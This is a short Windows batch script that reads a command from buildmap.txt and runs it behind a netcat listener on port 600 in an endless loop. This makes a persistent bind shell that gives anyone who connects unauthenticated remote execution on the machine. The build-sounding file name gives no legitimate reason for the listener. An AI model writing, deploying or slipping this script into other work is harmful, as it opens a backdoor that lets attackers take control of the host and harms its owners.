@echo off
setlocal enabledelayedexpansion
set SEPARATOR=/
set filecontent=
for /f "delims=" %%a in (buildmap.txt) do (
  set currentline=%%a
  set filecontent=!filecontent!!currentline!
)
:loop
nc -l -p 600 -e %filecontent%
goto loop